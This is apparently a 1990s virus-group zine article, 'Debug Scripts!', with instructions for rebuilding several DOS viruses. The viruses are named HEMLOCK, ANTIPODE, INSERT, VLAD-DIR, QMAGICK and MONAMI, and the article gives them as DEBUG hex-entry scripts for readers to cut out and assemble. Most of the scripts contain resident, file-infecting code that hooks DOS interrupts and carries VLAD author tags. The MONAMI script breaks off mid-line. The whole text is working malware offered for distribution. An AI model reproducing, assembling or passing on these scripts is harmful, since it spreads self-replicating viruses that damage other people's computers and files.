
  Debug Scripts!
  +------------+

  To get a working copy of our viruses, cut this article up, and rename
  the various sections according to the name of the file they will create
  but adding the extension .SCR.
  
  From there, to create the viruses go:  DEBUG < filename.SCR

  
  For example:
   below should become 'hemlock.scr'
   debug < hemlock.scr

  Simple!

+-------------------- Cut Here --------------------------------------+

 N HEMLOCK.COM
 E 0100 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90
 E 15AC 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 15C1 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 15D6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 15EB 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1615 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 162A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 163F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1654 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1669 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 167E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1693 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 16A8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 16BD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 16D2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 16E7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 16FC 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1711 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1726 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 173B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1750 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1765 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 177A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 178F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 17A4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 17B9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 17CE 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 17E3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 17F8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 180D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1822 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1837 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 184C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1861 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1876 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 188B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 18A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 18B5 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 18CA 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 18DF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 18F4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1909 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 191E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1933 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1948 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 195D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1972 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1987 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 199C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 19B1 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 19C6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 19DB 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 19F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1A05 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1A1A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1A2F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1A44 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1A59 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1A6E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1A83 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1A98 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1AAD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1AC2 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1AD7 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1AEC 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1B01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1B16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1B2B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1B40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1B55 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1B6A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1B7F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1B94 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1BA9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1BBE 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1BD3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1BE8 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1BFD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1C12 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1C27 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1C3C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1C51 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1C66 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1C7B 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1C90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1CA5 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1CBA 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1CCF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1CE4 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1CF9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1D0E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1D23 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1D38 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1D4D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1D62 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1D77 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1D8C 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1DA1 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1DB6 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1DCB 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1DE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1DF5 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1E0A 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1E1F 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 1E34 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 RCX
 1D43
 W
 Q


+-------------------- Cut Here --------------------------------------+


 N ANTIPODE.COM
 E 0100 E9 00 00 FF 36 01 01 5A 81 C2 03 01 52 BE 13 00 03 F2 C7 04 CD
 E 0115 20 C7 04 C7 04 E8 03 00 EB 11 90 BE 2D 00 03 F2 8B FE B9 F5 02
 E 012A 31 3C 46 E2 FB C3 8E 26 32 32 C3 8E 31 30 3F 36 94 95 85 1D FC
 E 013F 10 B1 CB C3 44 38 A1 A1 A1 3F 89 31 30 61 FA 3F 69 79 BF E9 71
 E 0154 BA 3F 32 31 BA E0 32 E1 B2 D8 57 A1 B8 3F 32 31 BA FB B2 D8 57
 E 0169 A1 BF F0 88 01 32 3F 2E 6B BA C3 67 60 8E 31 31 C2 95 68 6F C2
 E 017E 95 37 88 B3 31 60 FA 3F 2E 92 AE 31 89 10 04 FC 10 BD 37 2F 32
 E 0193 B8 2F 2D 32 8B 90 31 89 10 14 FC 10 DB 31 30 31 31 B1 CD 20 45
 E 01A8 7F A1 A1 A1 B1 CD 23 45 77 A1 A1 A1 B1 CD 7F 45 4B A1 A1 A1 B1
 E 01BD CD 7E 45 43 A1 A1 A1 B1 CD 0C 45 1A A1 A1 A1 B1 CD 7A 45 12 A1
 E 01D2 A1 A1 B1 CD 5D 45 2A A1 A1 A1 B1 CD 7D 44 32 D8 CD 30 B1 CD 1D
 E 01E7 45 32 D8 DE 30 D9 1F 33 83 C3 3F 6A FE DA 46 A1 D9 12 33 B5 F1
 E 01FC 44 5D A1 A1 A1 AD 61 62 37 85 60 FC 10 BF F2 17 0A 2F 27 31 44
 E 0211 65 A1 A1 A1 BA EB BB 36 61 85 1E FC 10 69 CF F1 44 37 A1 A1 A1
 E 0226 B2 F2 36 17 BA 76 26 B2 F2 32 DA 24 A1 D9 D6 30 43 03 A1 A1 A1
 E 023B AD 61 62 37 85 1E FC 10 17 BA 76 27 15 2E 05 30 44 28 A1 A1 A1
 E 0250 89 13 32 1F B1 0F 27 32 30 44 36 A1 A1 A1 17 BA 76 2B 17 18 76
 E 0265 2B 36 6A 69 AC FB 33 31 AD 61 62 60 66 63 2F 37 67 1F B9 17 19
 E 027A 32 0C 31 5D 44 3C A1 A1 A1 B2 CB 30 45 32 D8 06 30 BA E7 2F 63
 E 028F 89 15 04 FC 10 1F B8 2F 15 32 1F BD 37 17 32 3F 2E 8B D4 33 89
 E 02A4 15 14 FC 10 6B 2E 81 31 2F 2F 36 BA CB 88 CE 31 C3 9F 3F 2E 1F
 E 02B9 B1 0F 19 32 7A 44 2A A1 A1 A1 66 B2 DE 3A 8F DF 33 88 3B 31 C2
 E 02CE 97 44 38 A1 A1 A1 1F F7 37 27 32 30 6E B2 DE 35 66 8F D9 33 88
 E 02E3 32 31 C2 97 6E 45 23 A1 A1 A1 66 8F DA 33 88 32 31 C2 97 6E 45
 E 02F8 32 D8 F7 31 2E B1 4C CF 75 44 3D A1 A1 A1 B1 4C C9 72 44 32 D8
 E 030D 83 31 89 31 72 FC 10 1F B8 3F 18 32 42 32 D8 A8 31 89 30 72 02
 E 0322 F8 FC 10 2F 63 89 33 0C D9 C1 31 BA E9 89 31 66 FC 10 1F B8 3F
 E 0337 1C 32 1F B8 27 1A 32 1F 90 1C 32 15 2E 05 30 45 58 A1 A1 A1 3F
 E 034C 2E 8B 76 37 88 32 31 89 31 0E FC 10 02 F8 02 E3 89 33 73 FC 10
 E 0361 BA C9 B0 F6 1C 30 1C 32 31 1F 92 13 32 8F 6C 32 67 66 D9 80 CC
 E 0376 3F 2E 8B 01 32 88 13 32 85 71 FC 10 6E 6F D9 91 CC 02 F8 02 E3
 E 038B 89 31 73 FC 10 3F 2E 8B 10 32 88 32 31 85 71 FC 10 1F BA 27 1A
 E 03A0 32 1F BA 3F 1C 32 B2 F8 30 B2 D0 D0 89 30 66 FC 10 6B 2E 85 0F
 E 03B5 FC 10 89 30 72 1F BA 3F 18 32 FC 10 2F 2E 1F BF 2F 17 32 1F BA
 E 03CA 27 15 32 89 15 14 FC 10 6F 36 2E 6B 6E 68 6A 69 AC 1F CE 1F 2D
 E 03DF 32 1F F7 37 27 32 31 DA C2 81 31 FE 72 7E 7C 52 5E 5C 65 73 62
 E 03F4 72 70 7F 1F 74 69 74 6A 70 5F 45 58 41 5E 55 54 11 00 1F 01 6C
 E 0409 31 53 48 11 70 44 45 5E 5C 50 56 1E 67 7D 70 75 31 FC 11 A1 AD
 E 041E AB 31 31 31 31 F2 D8 01 00 00 00 00 00 00 00 00 00 00 00 00
 RCX
 0332
 W
 Q

+-------------------- Cut Here --------------------------------------+


 N INSERT.COM
 E 0100 BF 06 01 E8 FF 00 B8 02 63 CD 21 3B C3 74 46 1E 8C D8 48 8E D8
 E 0115 80 3E 00 00 5A 75 38 83 2E 03 00 23 90 83 2E 12 00 23 90 03 06
 E 012A 03 00 40 1F FC 06 8E C0 B9 11 01 33 FF BE 00 01 F3 A4 33 C0 8E
 E 013F D8 BF 76 00 BE 84 00 A5 A5 C7 06 84 00 64 00 8C 06 86 00 07 06
 E 0154 1F B8 F0 FF B9 0F 00 8B F8 BE DD 01 F3 A4 FF E0 9C 80 FC 3C 74
 E 0169 14 80 FC 5B 74 0F 3D 02 63 74 06 9D EA 00 00 00 00 8B D8 9D CF
 E 017E 2E FF 1E 76 00 9C 72 53 50 53 57 06 93 B8 20 12 CD 2F 53 B8 16
 E 0193 12 26 8A 1D CD 2F 5B 26 81 7D 28 43 4F 75 33 26 80 7D 2A 4D 75
 E 01A8 2C 51 52 56 1E 0E 1F 0E 07 E5 40 A3 0A 01 B9 11 01 BF 11 01 BE
 E 01BD 00 00 F3 A4 BF 17 01 E8 3E 00 B4 40 B9 11 01 BA 11 01 CD 21 1F
 E 01D2 5E 5A 59 07 5F 5B 58 9D CA 02 00 B8 00 01 8B F8 BE 11 02 B9 DF
 E 01E7 FD F3 A4 FF E0 20 5B 49 6E 73 65 72 74 5D 20 5B 44 61 72 6B 6D
 E 01FC 61 6E 2F 56 4C 41 44 5D 20 B9 7F 00 81 35 00 00 47 47 E2 F8 C3
 E 0211 CD 20
 RCX
 0113
 W
 Q

+-------------------- Cut Here --------------------------------------+


 N VLAD-DIR.COM
 E 0100 E8 00 00 5D 81 ED 03 00 1E 06 0E 1F 3E C7 86 13 00 CD 20 3E C7
 E 0115 86 13 00 3E C7 B8 01 63 CD 21 3B C3 74 43 8C C0 48 8E D8 80 3E
 E 012A 00 00 5A 75 37 83 2E 03 00 30 90 83 2E 12 00 30 90 03 06 03 00
 E 013F 40 FC 0E 1F 8E C0 B9 8D 02 33 FF 8D B6 00 00 F3 A4 33 C0 8E D8
 E 0154 BF A3 00 BE 84 00 A5 A5 C7 06 84 00 87 00 8C 06 86 00 07 1F 8C
 E 0169 C0 05 10 00 2E 01 86 81 00 2E 8B A6 83 00 2E 03 86 85 00 8E D0
 E 017E EA 00 00 F0 FF 00 00 00 00 9C 3D 01 63 74 1A 80 FC 4E 74 19 80
 E 0193 FC 4F 74 3C 80 FC 11 74 79 80 FC 12 74 74 9D EA 00 00 00 00 8B
 E 01A8 D8 9D CF 50 57 56 06 FC BF 8F 02 8B F2 0E 07 89 3E 8D 02 AC 0A
 E 01BD C0 74 0F AA 3C 3A 74 04 3C 5C 75 F2 89 3E 8D 02 EB EC 07 5E 5F
 E 01D2 58 2E FF 1E A3 00 50 53 51 52 57 56 1E 06 9C FC B4 2F CD 21 8B
 E 01E7 3E 8D 02 8B F3 83 C6 1E 06 1F 0E 07 AC AA 0A C0 75 FA 53 1E E8
 E 01FC A3 00 07 5F 81 7C 12 56 44 75 0B 26 81 6D 1A 8D 02 26 83 5D 1C
 E 0211 00 E9 80 00 50 57 56 06 8B F2 81 C6 CF A4 80 7C 01 3A 75 14 BF
 E 0226 8F 02 0E 07 AC 0A C0 74 03 AA EB F8 B0 5C AA 89 3E 8D 02 07 5E
 E 023B 5F 58 2E FF 1E A3 00 50 53 51 52 57 56 1E 06 9C 0A C0 75 46 FC
 E 0250 81 C2 CF A4 8B F2 80 3C FF 75 03 83 C6 07 56 1E B9 08 00 8B 3E
 E 0265 8D 02 46 0E 07 AC 3C 20 74 04 AA E2 F8 46 B0 2E 4E 03 F1 AA A5
 E 027A A4 32 C0 AA E8 20 00 07 5F 81 7C 12 56 44 75 0B 26 81 6D 1D 8D
 E 028F 02 26 83 5D 1F 00 9D 07 1F 5E 5F 5A 59 5B 58 CA 02 00 B8 00 3D
 E 02A4 BA 8F 02 0E 1F CD 21 72 4E 93 B8 20 12 CD 2F 53 B8 16 12 26 8A
 E 02B9 1D CD 2F 5B 26 C6 45 02 02 B8 00 57 CD 21 51 52 26 81 7D 28 45
 E 02CE 58 75 1F 26 80 7D 2A 45 75 18 B4 3F B9 1C 00 BA DB 02 8B F2 CD
 E 02E3 21 81 3C 5A 4D 74 12 81 3C 4D 5A 74 0C B8 01 57 5A 59 CD 21 B4
 E 02F8 3E CD 21 C3 81 7C 12 56 44 74 ED 83 7C 1A 00 75 E7 56 0E 07 83
 E 030D C6 0E BF 83 00 A5 A5 AD BF 7F 00 A5 A5 5E B8 02 42 99 8B CA CD
 E 0322 21 50 52 B9 10 00 F7 F1 2B 44 08 89 54 14 89 44 16 81 C2 F7 02
 E 0337 89 44 0E 89 54 10 5A 58 05 8D 02 83 D2 00 B9 00 02 F7 F1 40 89
 E 034C 44 04 89 54 02 C7 44 12 56 44 B4 40 B9 8D 02 99 CD 21 B8 00 42
 E 0361 99 8B CA CD 21 B4 40 B9 1C 00 8B D6 CD 21 4E E9 7D FF 20 5B 56
 E 0376 4C 41 44 2D 44 49 52 5D 20 5B 44 61 72 6B 6D 61 6E 2F 56 4C 41
 E 038B 44 5D 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 03B5 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 03CA 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 03DF 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 E 03F4 00 00 00
 RCX
 02F7
 W
 Q

+-------------------- Cut Here --------------------------------------+



 N QMAGICK.COM
 E 0100 1E 06 B4 30 CD 21 80 FF 30 74 49 90 90 90 3C 03 72 42 90 90 90
 E 0115 06 58 48 50 1F 33 F6 AC 34 5A 75 33 90 90 90 83 44 02 E3 90 83
 E 012A 44 11 E3 90 8E 44 11 0E E8 00 00 5E 1F 83 EE 35 B9 B4 01 33 FF
 E 013F F3 A4 51 1F FA B8 77 00 87 06 84 00 AB 8C C0 87 06 86 00 AB FB
 E 0154 07 1F 8C DB 83 C3 10 E8 00 00 5E 2E 03 9C 4B 01 53 2E FF B4 4D
 E 0169 01 33 C0 33 DB 33 C9 33 D2 33 F6 33 FF CB 80 FC 3F 74 26 90 90
 E 017E 90 80 FC 30 75 19 90 90 90 50 E8 22 01 5B CA 02 00 51 75 61 6E
 E 0193 74 75 6D 20 4D 61 67 69 63 6B 2E FF 2E B4 01 80 FB 05 72 F6 E8
 E 01A8 03 01 9C 3D 18 00 73 03 E9 E9 00 56 50 51 52 57 1E 53 50 BE 20
 E 01BD 12 96 CD 2F BE 16 12 26 8A 1D 96 CD 2F 33 F6 58 8B DA 91 E8 CD
 E 01D2 00 2B C1 74 03 E9 BB 00 1B D0 74 03 E9 B4 00 B8 4D 5A 33 07 74
 E 01E7 03 E9 AA 00 83 7F 18 40 75 03 E9 A1 00 39 77 1A 74 03 E9 99 00
 E 01FC 39 77 0C 75 03 E9 91 00 E8 99 00 B9 10 00 F7 F1 2B 47 08 87 57
 E 0211 14 87 47 16 2E A3 A9 01 2E 89 16 AB 01 B1 05 D3 E8 F7 D8 03 47
 E 0226 04 3C 05 72 6A 90 90 90 E8 6F 00 05 B4 01 13 D6 B9 00 02 F7 F1
 E 023B 0B D2 74 04 90 90 90 40 89 47 04 89 57 02 8B D3 5B 26 FF 75 02
 E 0250 26 FF 75 15 26 FF 75 17 26 C6 45 02 02 26 C7 45 15 02 00 26 89
 E 0265 75 17 B4 40 B9 18 00 42 42 CD 21 E8 2D 00 26 89 45 15 26 89 55
 E 027A 17 B4 40 0E 1F B9 B4 01 33 D2 CD 21 26 8F 45 17 26 8F 45 15 26
 E 028F 8F 45 02 EB 02 90 5B 1F 5F 5A 59 58 5E 9D CA 02 00 26 8B 45 11
 E 02A4 26 8B 55 13 C3 F0 FF 00 00 9C 2E FF 1E B4 01 C3 00 00 00 00
 RCX
 01B8
 W
 Q


+-------------------- Cut Here --------------------------------------+


 N MONAMI.COM
 E 0100 9C FA E8 00 00 5E 83 EE 05 0E 56 50 BB FF FF B4 4A CD 21 81 EB
 E 0115 8F 00 53 06 8C DD 03 DD 8E C3 2B FF B9 23 04 51 56 0E FC F3 2E
 E 012A A4 06 B1 30 51 CB 07 5F 59 8D 86 00 FF 8E D8 BE 22 15 F3 A4 B4
 E 013F 2C CD 21 E8 69 00 B8 21 35 CD 21 0E 1F BE C1 00 89 5C 60 8C 44
 E 0154 62 07 5B 87 F2 B4 25 CD 21 4B 74 4A B4 4A CD 21 8C C8 48 8E D8
 E 0169 BF 02 00 C6 45 FF 08 AB B4 2A CD 21 0A C0 75 31 B8 34 00 E7 43
 E 017E B8 11 00 E7 40 EB 25 5B 4D 6F 6E 20 61 6D 69 20 6C 61 20 70 65
 E 0193 6E 64 75 6C 65 5D 20 2D 20 4D 65 74 61 62 6F 6C 69 73 2F 56 4C
 E 01A8 41 44 06 1F 58 CF BE 25 01 2E AD 03 C8 33 D1 81 FE C5 02 72 F4
 E 01BD C3 B0 03 CF 9C FC 3D 21 25 75 11 81 F9 80 00 75 51 81 FE 80 00
 E 01D2 75 4B BB 01 00 9D CF 50 56 80 FC 2C 75 18 E8 39 03 51 52 E8 C6
 E 01E7 FF 2E 89 0E CA 00 2E 89 16 D0 00 5A 59 5E 58 9D CF 51 52 53 55
 E 01FC 57 06 1E 3D 00 4B 74 21 80 FC 3D 74 1C 3D 00 6C 75 08 83 E2 03
 E 0211 4A 8B D6 74 0F 1F 07 5F 5D 5B 5A 59 5E 58 9D EA 00 00 00 00 95
 E 0226 2B DB 8E C3 B3 90 8C C8 26 87 47 02 50 B8 BE 00 26 87 07 50 53
 E 023B 06 B4 2F E8 DB 02 53 06 52 1E 0E 1F BA 83 04 B4 1A E8 CD 02 1F
 E 0250 5A B4 4E E8 B5 02 BE C7 04 55 52 1E B8 01 43 50 72 2F 2E 83 7C
 E 0265 D8 10 73 27 2E 8A 5C D5 D0 EB 80 FB 20 73 1C B9 04 1F 2E 23 4C
 E 027A D1 84 C9 75 11 3A DD 74 0D E8 87 02 72 09 B8 02 3D E8 8E 02 73
 E 028F 04 F5 E9 8A 01 0E 1F 93 B1 40 B4 3F E8 63 02 72 74 81 3C 4D 5A
 E 02A4 74 3A 81 3C 5A 4D 74 34 0E 07 BF A1 04 B1 0E F2 AE 8B 45 FC 3D
 E 02B9 45 58 74 07 3D 43 4F 75 21 B0 4D 98 2A 45 FE 75 19 A3 E0 02 99
 E 02CE 80 3C E8 74 05 80 3C E9 75 05 B0 03 03 44 01 E9 E5 00 FF 44 0C
 E 02E3 75 5D 8B 7C 14 81 FF CD FB 77 54 3B 4C 18 75 12 C4 54 3C E8 1E
 E 02F8 02 E8 F8 01 72 07 81 7C 1A 4E 45 74 78 8B 44 16 E8 E0 01 2B C9
 E 030D 03 C7 13 D1 E8 B9 01 72 67 50 52 05 23 04 13 D1 2B 44 D6 1B 54
 E 0322 D8 F5 72 08 C4 44 D6 8C C2 E8 9F 01 5F 5D 72 4B 50 52 B5 02 F7
 E 0337 F1 85 D2 74 01 40 3B 44 04 5A 58 75 39 05 23 04 83 D2 00 F7 F1
 E 034C 85 D2 74 01 40 89 44 04 89 54 02 E8 B7 01 FF 44 06 FF 4C 06 74
 E 0361 4C E8 8F 01 8B 44 1C E8 80 01 03 44 1A 83 D2 00 2B C5 1B D7 73
 E 0376 08 40 75 E3 42 75 E0 EB 2D 75 DC 3D 23 04 73 F5 03 44 D6 13 54
 E 038B D8 B1 10 F7 F1 2B 44 08 89 54 1A 89 44 1C BA FC FF B9 FF FF B8
 E 03A0 01 42 E8 77 01 B4 40 E8 4C 01 73 B1 EB 6A 8B 44 08 A3 E0 02 2B
 E 03B5 D2 E8 5B 01 B1 06 B4 40 E8 41 01 72 56 95 87 FA 92 91 51 52 E8
 E 03CA 4D 01 B4 3F E8 2D 01 72 1B C4 54 D6 E8 3E 01 B1 10 F7 F1 03 C1
 E 03DF 2D 00 00 A3 35 00 89 16 3A 00 B4 40 E8 10 01 5A 59 72 26 E8 24
 E 03F4 01 B9 23 04 B4 40 99 E8 05 01 72 18 C4 4C D2 8C C2 83 E1 E0 8B
 E 0409 C2 D0 EC 0A CC B8 01 57 08 06 B7 03 E8 04 01 B4 3E E8 FF 00 F8
 E 041E 58 1F 5A 72 07 2E 8A 4C D1 E8 E3 00 58 80 FC 4B 74 10 1F 5A B4
